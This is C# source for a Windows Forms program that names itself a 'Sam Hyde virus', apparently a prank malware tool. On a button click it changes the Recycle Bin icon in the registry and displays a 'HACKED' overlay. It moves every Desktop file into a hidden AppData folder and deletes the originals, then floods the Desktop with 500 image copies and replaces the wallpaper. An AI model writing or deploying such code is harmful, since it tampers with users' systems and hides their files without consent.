using Microsoft.Win32;
using MrSmarty.CodeProject;
using System;
using System.CodeDom;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Threading;
using System.Xml.Linq;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;

namespace samHydeVirus
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uiAction, UInt32
    uiParam, String pvParam, UInt32 fWinIni);
        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_UPDATEINIFILE = 0x1;

        [DllImport("user32")]
        private static extern int PostMessage(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam);
        [DllImport("user32")]
        private static extern IntPtr FindWindow(string className, string caption);
        [DllImport("user32")]
        private static extern IntPtr FindWindowEx(IntPtr parent, IntPtr startChild, string className, string caption);
        public void RefreshDesktop()
        {
            IntPtr d = FindWindow("Progman", "Program Manager");
            d = FindWindowEx(d, IntPtr.Zero, "SHELLDLL_DefView", null);
            d = FindWindowEx(d, IntPtr.Zero, "SysListView32", null);
            PostMessage(d, 0x100, new IntPtr(0x74), IntPtr.Zero);//WM_KEYDOWN = 0x100  VK_F5 = 0x74
            PostMessage(d, 0x101, new IntPtr(0x74), new IntPtr(1 << 31));//WM_KEYUP = 0x101
        }

        public Form1()
        {


            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (!File.Exists(@"C:\Users\" + Environment.UserName + @"\00001.mp3") || !File.Exists(@"C:\Users\" + Environment.UserName + @"\00002.ico"))
            {
                Bootstrapper bs = new Bootstrapper();
                bs.ShowDialog();
            }
            this.Hide();
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\DefaultIcon", true);

            key.SetValue("empty", @"%USERPROFILE%\00002.ico" + ",0");
            key.SetValue("full", @"%USERPROFILE%\00002.ico" + ",0");
            key.Close();

            RefreshDesktop();

            FloatingOSDWindow osd1 = new FloatingOSDWindow();
            osd1.Show(new Point(500, 500), 155, Color.Lime,
   new Font("Helvetica", 24f, FontStyle.Bold | FontStyle.Italic),
                int.MaxValue, FloatingWindow.AnimateMode.RollRightToLeft,
                250, "HACKED BY SAM HYDE");
            MessageBox.Show("Close 1 Sam Hyde bag, and another one will appear. Good luck.");
            SamHax funkymonkeychunk = new SamHax();
            funkymonkeychunk.Show();
            // Funky Monkey make everythoing sam hyde bag.
            string abc = RandomString(5);
            Directory.CreateDirectory(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\wz2h-" + abc);
            IEnumerable<string> f = Directory.EnumerateFiles(@"C:\Users\" + Environment.UserName + @"\Desktop");
            foreach (string f2 in f)
            {
                File.Copy(f2, @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\wz2h-" + abc + "\\" + f2.Split(new[] { "\\" }, StringSplitOptions.RemoveEmptyEntries).ElementAt(4));
                File.Delete(f2);
            }
            for (int i = 0; i < 500; i++)
            {
                File.Copy(@"C:\Users\" + Environment.UserName + @"\00001.mp3", @"C:\Users\" + Environment.UserName + @"\Desktop\sam hYDe BAG " + i + ".jpg");
            }
            Wallpaper.Set(new System.Uri(@"C:\Users\" + Environment.UserName + @"\00001.mp3"), Wallpaper.Style.Stretched);

        }
        private static Random random = new Random();

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {


        }

        public static void DelayAction(int millisecond, Action action)
        {
            var timer = new DispatcherTimer();
            timer.Tick += delegate

            {
                action.Invoke();
                timer.Stop();
            };

            timer.Interval = TimeSpan.FromMilliseconds(millisecond);
            timer.Start();
        }
    }
    }
